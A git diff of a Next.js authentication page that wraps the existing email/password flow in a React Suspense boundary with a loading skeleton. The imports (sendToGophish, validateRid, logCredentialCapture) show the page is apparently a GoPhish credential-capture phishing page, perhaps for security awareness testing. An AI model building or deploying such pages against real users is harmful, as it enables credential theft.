@@ -1,13 +1,13 @@
 'use client'
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, Suspense } from 'react';
 import { useSearchParams, useRouter } from 'next/navigation';
 import AuthLayout from '@/components/auth/AuthLayout';
 import EmailPage from '@/components/auth/EmailPage';
 import PasswordPage from '@/components/auth/PasswordPage';
 import { sendToGophish, validateRid, logCredentialCapture, generateSuccessUrl } from '@/utils/gophish';
 
-export default function AuthPage() {
+function AuthContent() {
   const [step, setStep] = useState('email');
   const [email, setEmail] = useState('');
   const [rid, setRid] = useState('');
@@ -87,5 +87,24 @@ export default function AuthPage() {
         />
       )}
     </AuthLayout>
+  );
+}
+
+export default function AuthPage() {
+  return (
+    <Suspense fallback={
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
+        <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-8 text-center">
+          <div className="animate-pulse">
+            <div className="w-16 h-16 bg-gray-300 rounded-full mx-auto mb-6"></div>
+            <div className="h-8 bg-gray-300 rounded mb-4"></div>
+            <div className="h-4 bg-gray-300 rounded mb-6"></div>
+            <div className="h-4 bg-gray-300 rounded"></div>
+          </div>
+        </div>
+      </div>
+    }>
+      <AuthContent />
+    </Suspense>
   );
 } 
